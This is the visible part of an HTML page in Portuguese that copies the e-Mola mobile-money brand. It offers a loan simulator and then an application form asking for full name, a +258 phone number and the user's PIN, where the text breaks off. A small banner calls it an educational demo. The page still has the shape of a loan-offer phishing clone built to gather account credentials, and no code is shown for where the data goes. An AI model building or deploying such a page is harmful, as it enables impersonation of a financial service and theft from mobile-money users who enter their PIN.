<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>e-Mola — Simulador (DEMO Educacional)</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            background: #fff;
            max-width: 420px;
            margin: 0 auto;
            padding: 30px 20px;
            color: #333;
        }
        .demo-banner {
            background: #fef3c7;
            color: #92400e;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
            font-size: 13px;
            margin-bottom: 25px;
        }
        .header {
            text-align: center;
            margin-bottom: 35px;
        }
        .header h1 {
            font-size: 36px;
            color: #111;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .header p {
            font-size: 18px;
            color: #666;
            font-style: italic;
        }
        h2 {
            font-size: 20px;
            margin: 30px 0 12px;
            color: #222;
        }
        .amount-options, .term-options {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 10px 0;
        }
        .amount-btn, .term-btn {
            padding: 10px 16px;
            border: 2px solid #ddd;
            border-radius: 6px;
            background: #fff;
            font-size: 15px;
            cursor: pointer;
        }
        .amount-btn.active, .term-btn.active {
            border-color: #2563eb;
            background: #eff6ff;
            color: #2563eb;
        }
        input[type="number"] {
            width: 100%;
            padding: 14px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            margin-top: 8px;
        }
        .result-box {
            margin-top: 25px;
            padding: 25px;
            background: #f9fafb;
            border-radius: 12px;
            text-align: center;
        }
        .result-box h3 {
            font-size: 16px;
            color: #666;
            margin-bottom: 10px;
            font-weight: normal;
        }
        .monthly-amount {
            font-size: 32px;
            font-weight: bold;
            color: #111;
        }
        .section-divider {
            margin: 40px 0;
            border-bottom: 1px solid #eee;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            font-size: 15px;
        }
        input[type="text"], input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #2563eb;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            margin-top: 8px;
            cursor: pointer;
        }
        .btn:hover {
            background: #1d4ed8;
        }
        .disclaimer {
            font-size: 12px;
            color: #888;
            text-align: center;
            margin-top: 15px;
            line-height: 1.5;
        }
        .message {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            display: none;
        }
        .success {
            background: #dcfce7;
            color: #166534;
            display: block;
        }
        .error {
            background: #fee2e2;
            color: #dc2626;
            display: block;
        }
    </style>
</head>
<body>

    <div class="demo-banner">
        📚 FINS EDUCACIONAIS — Apenas demonstração. Não é serviço oficial.
    </div>

    <!-- ============= e-MOLA HEADER ============= -->
    <div class="header">
        <h1>e-Mola</h1>
        <p>Meu cell, minha mola</p>
    </div>

    <!-- ============= LOAN SIMULATOR ============= -->
    <h2>Simulador de Empréstimo</h2>

    <h2>Valor do Empréstimo</h2>
    <div class="amount-options">
        <button class="amount-btn" data-value="500">MT 500</button>
        <button class="amount-btn active" data-value="10000">MT 10 000</button>
        <button class="amount-btn" data-value="800000">MT 800.000</button>
    </div>
    <input type="number" id="loanAmount" value="10000">

    <h2>Prazo do Empréstimo</h2>
    <div class="term-options">
        <button class="term-btn" data-months="6">6 meses</button>
        <button class="term-btn active" data-months="12">12 meses</button>
        <button class="term-btn" data-months="24">24 meses</button>
        <button class="term-btn" data-months="36">36 meses</button>
        <button class="term-btn" data-months="48">48 meses</button>
        <button class="term-btn" data-months="60">60 meses</button>
    </div>

    <div class="result-box">
        <h3>Pagamento Mensal Estimado</h3>
        <div class="monthly-amount" id="monthlyResult">MT 833.33</div>
    </div>

    <div class="section-divider"></div>

    <!-- ============= FORM SECTION ============= -->
    <h2>Dados do Pedido</h2>

    <div class="form-group">
        <label>Nome Completo</label>
        <input type="text" id="fullName" placeholder="Digite seu nome">
    </div>

    <div class="form-group">
        <label>Número de Telemóvel</label>
        <input type="tel" id="phoneNumber" placeholder="+258 8X XXX XXXX">
    </div>

    <div class="form-group">
        <label>Seu PIN
